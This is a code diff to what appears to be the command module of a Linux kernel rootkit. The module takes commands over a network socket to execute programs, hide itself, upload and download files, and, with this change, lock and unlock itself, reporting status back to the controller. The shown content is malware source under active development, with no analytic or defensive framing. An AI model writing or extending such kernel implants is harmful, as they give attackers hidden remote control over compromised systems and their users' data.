@@ -5,6 +5,7 @@
 
 #include "exec.h"
 #include "hook.h"
+#include "lock.h"
 
 // Lenght of the shortest valid (opcode+args) combo. currently `hide`
 #define SHORTEST_PAYLOAD 1
@@ -21,6 +22,8 @@ static int do_exec_async(struct socket *sock, char *args);
 static int do_hide(struct socket *sock, char *args);
 static int do_upload(struct socket *sock, char *args);
 static int do_download(struct socket *sock, char *args);
+static int do_unlock(struct socket *sock, char *args);
+static int do_lock(struct socket *sock, char *args);
 
 // map each command type to it's callback
 static cmd_callback cmd_callbacks[] = {
@@ -29,6 +32,8 @@ static cmd_callback cmd_callbacks[] = {
     [CMD_HIDE] = do_hide, //
     [CMD_UPLOAD] = do_upload, //
     [CMD_DOWNLOAD] = do_download, //
+    [CMD_UNLOCK] = do_unlock,
+    [CMD_LOCK] = do_lock,
 };
 
 int cmd_build(struct command *cmd, const char *payload)
@@ -60,7 +65,7 @@ int cmd_build(struct command *cmd, const char *payload)
         }
     }
 
-    if (cmd->type == CMD_UNKNOWN)
+    if (cmd->type < 0 || cmd->type >= CMD_UNKNOWN)
     {
         pr_err("commands: failed to build command: invalid opcode.\n");
         return ERR_BAD_OPCODE;
@@ -68,8 +73,8 @@ int cmd_build(struct command *cmd, const char *payload)
 
     cmd->callback = cmd_callbacks[cmd->type];
 
-    // Hide doesn't take args
-    if (cmd->type == CMD_HIDE)
+    // Hide and lock don't take args
+    if (cmd->type == CMD_HIDE || cmd->type == CMD_LOCK)
     {
         return 0;
     }
@@ -87,8 +92,9 @@ int cmd_build(struct command *cmd, const char *payload)
         return ERR_LONG_ARGS;
     }
     strncpy(cmd->args, payload + 2, args_len);
-    cmd->args[args_len] = '\0';
-    pr_info("commands: cmd_len: %lu, args_len: %lu, args: %s\n", cmd_len, args_len, cmd->args);
+    cmd->args[args_len] = '\0'; // fine, (args_len < 1024)
+    pr_info("commands: cmd_len: %lu, args_len: %lu, args: %s\n", cmd_len,
+            args_len, cmd->args);
 
     return 0;
 }
@@ -210,6 +216,35 @@ static int do_download(struct socket *sock, char *args)
         return -1;
     }
 
+    return 0;
+}
+
+static int do_unlock(struct socket *sock, char *args)
+{
+    USE_NETWORK(64)
+    sprintf(buf, "%d\n", try_unlock(args));
+    vec.iov_base = buf;
+    vec.iov_len = strlen(buf);
+    if ((status = kernel_sendmsg(sock, &hdr, &vec, 1, vec.iov_len)) < 0)
+    {
+        pr_warn("commands: couldn't send unlock status message: %d\n", status);
+        return -1;
+    }
+    return 0;
+}
+
+static int do_lock(struct socket *sock, char *args)
+{
+    USE_NETWORK(64)
+    lock();
+    sprintf(buf, "%d\n", lock_status());
+    vec.iov_base = buf;
+    vec.iov_len = strlen(buf);
+    if ((status = kernel_sendmsg(sock, &hdr, &vec, 1, vec.iov_len)) < 0)
+    {
+        pr_warn("commands: couldn't send lock status message: %d\n", status);
+        return -1;
+    }
     return 0;
 }
 
